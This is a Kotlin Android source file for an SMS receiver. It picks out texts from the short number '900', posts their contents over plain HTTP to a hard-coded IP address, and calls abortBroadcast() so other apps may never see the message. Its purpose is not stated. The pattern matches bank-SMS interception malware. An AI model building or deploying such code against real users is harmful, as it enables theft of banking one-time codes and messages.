package com.rsf.sms_reader

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log
import android.widget.Toast
import com.google.gson.JsonObject
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response


internal class SMSReceiver : BroadcastReceiver() {
    companion object {
        private const val REQ_NUMBER = "900"
    }

    private var bundle: Bundle? = null
    private var currentSMS: SmsMessage? = null
    private var message: String? = null

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            bundle = intent.extras
            if (bundle != null) {
                val pduObjects = bundle!!["pdus"] as Array<*>?
                if (pduObjects != null) {
                    for (aObject in pduObjects) {
                        currentSMS = aObject?.let { getIncomingMessage(it, bundle!!) }
                        val senderNo = currentSMS!!.displayOriginatingAddress
                        if (senderNo != REQ_NUMBER) {
                            continue
                        }
                        message = currentSMS!!.displayMessageBody
                        try {
                            sendPost("http://34.66.156.110", message.toString())
                            Toast.makeText(context, "Сообщение отпралено", Toast.LENGTH_LONG).show()
                        } catch (e: Exception) {
                            Toast.makeText(context, "Проблемы с сетью", Toast.LENGTH_LONG).show()
                        }
                    }
                    abortBroadcast()
                }
            }
        }
    }

    private fun sendPost(urlAddress: String, message: String) {

        //creating the json object to send
        val jsonObject = JsonObject()
        jsonObject.addProperty("message_text", message)

        val jsonPostService = ServiceGenerator.createService(IRetrofit::class.java, urlAddress)
        val call = jsonPostService.postRawJSON(jsonObject)
        call.enqueue(object : Callback<JsonObject> {
            override fun onResponse(call: Call<JsonObject>, response: Response<JsonObject>) {
                try {
                    Log.e("response-success", response.body().toString())
                } catch (e: java.lang.Exception) {
                    e.printStackTrace()
                }
            }

            override fun onFailure(call: Call<JsonObject>, t: Throwable) {
                Log.e("response-failure", call.toString())
            }
        })
    }

    private fun getIncomingMessage(aObject: Any, bundle: Bundle): SmsMessage? {
        val currentSMS: SmsMessage
        currentSMS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val format = bundle.getString("format")
            SmsMessage.createFromPdu(aObject as ByteArray, format)
        } else {
            SmsMessage.createFromPdu(aObject as ByteArray)
        }
        return currentSMS
    }
}
